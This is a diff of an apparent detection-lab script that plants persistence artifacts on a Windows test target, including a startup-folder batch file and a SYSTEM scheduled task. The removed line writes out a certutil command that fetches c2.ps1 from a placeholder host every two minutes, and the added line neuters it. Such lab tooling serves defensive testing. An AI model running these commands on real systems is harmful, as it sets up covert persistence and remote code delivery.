@@ -19,7 +19,7 @@ say "dropping a startup-folder beacon"
 root_ps "Set-Content -Path 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dbcheck.bat' -Encoding ASCII -Value 'rem elmer-lab'"
 
 say "dropping a certutil beacon scheduled task (fires every 2 minutes)"
-root_ps "schtasks /create /tn DbCheck /sc minute /mo 2 /ru SYSTEM /f /tr 'certutil -urlcache -split -f http://$HOST_IP:8000/c2.ps1 C:\Windows\Temp\c2.ps1'"
+root "schtasks /create /tn DbCheck /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f /tr certutil.exe"
 
 note "expected on the target:"
 note "  process    CRITICAL persist-netuser — net user /add and net localgroup /add"
